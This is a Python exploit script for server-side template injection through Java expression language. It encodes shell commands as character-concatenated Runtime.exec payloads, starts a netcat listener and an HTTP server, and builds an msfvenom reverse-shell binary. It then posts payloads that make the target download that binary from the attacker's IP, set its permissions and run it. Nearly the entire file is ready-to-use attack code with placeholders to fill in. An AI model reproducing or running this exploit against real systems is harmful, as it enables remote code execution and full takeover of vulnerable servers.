import urllib.parse
import sys
import requests as r
import subprocess
import os.path
import time
import multiprocessing


def convertPayload(payload):
	base = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("
	end = ").getInputStream())}"

	payloadCharBase = "T(java.lang.Character).toString("
	payloadCharEnd = ")"

	convList = ["{0}{1}{2}".format(payloadCharBase,ord(c),payloadCharEnd) for c in payload ]

	convString = convList[0]
	for elem in convList[1:]:
		convString += ".concat({0})".format(elem)

	return "{0}{1}{2}".format(base,convString,end)



def start_server(port):
	
	from http.server import HTTPServer, SimpleHTTPRequestHandler
	httpd = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
	httpd.serve_forever()


def start_listener(port):
	with open('bind.sh', 'w') as f:
    		f.write("nc -lvp {0}".format(port))
    		
	currPath = os.getcwdb().decode()
	subprocess.call(['chmod', '700', "bind.sh"])
	time.sleep(1)
	subprocess.call(['gnome-terminal', '-x', "{0}/bind.sh".format(currPath)])
	time.sleep(1)
	p = subprocess.Popen("rm bind.sh", shell=True)


##############################################################################################
# Requires msfvenom and netcat to be installed and the possibility to spawn a gnome-terminal #
# Some lines in the post requests should be modified to have the correct body in request     #
# Lines are marked									     #
##############################################################################################

ip = "10.10.10.10"				# Change this: your IP
http_port = 9999 				# Change this: The port where to setup the HTTP Server from which to download the payload
listen_port = 9999				# Change this: Listening port for reverse Shell 
shell = "MyRev.elf"				# Name for msfvenom payload's file
file_format = "elf"				# Change as required: Format for msfvenom
remoteURL = "http://<host>:<port>/<endpoint>" 	# Change this: vulnerable post endpoint to Template Engine Injection
msfPayload = "linux/x64/shell_reverse_tcp"    	# Change as required: msfvenom payload



msfCmd = "msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}".format(msfPayload, ip, listen_port, file_format, shell)


print("Starting listener on new shell..")

y = multiprocessing.Process(target=start_listener,args=(listen_port,))
y.start()


print("Starting HTTP Server..")

x = multiprocessing.Process(target=start_server,args=(http_port,))
x.start()




print("Creating rev  shell payload...")
p = subprocess.Popen("rm {0}".format(shell), shell=True)
time.sleep(2)
p = subprocess.Popen(msfCmd, shell=True)




while not os.path.exists(shell):
	print("Checking for payload...")
	time.sleep(5)


print("Removing old payload..")

payload = convertPayload("rm {0}".format(shell))
r.post(remoteURL, data={"name":payload}) # Modify to have the correct body for request



print("Downloading payload..")

payload = convertPayload("wget http://{0}:{1}/{2}".format(ip,http_port,shell))
r.post(remoteURL, data={"name":payload}) # Modify to have the correct body for request

print("Stopping HTTP Server..")
x.terminate()

print("Modifying file perms..")

payload = convertPayload("chmod 777 {0}".format(shell))
r.post(remoteURL,data={"name": payload}) # Modify to have the correct body for request

print("Executing payload..")

payload = convertPayload("./{0}".format(shell))
r.post(remoteURL,data={"name": payload}) # Modify to have the correct body for request


print("Exploit finished, check the new terminal for shell")


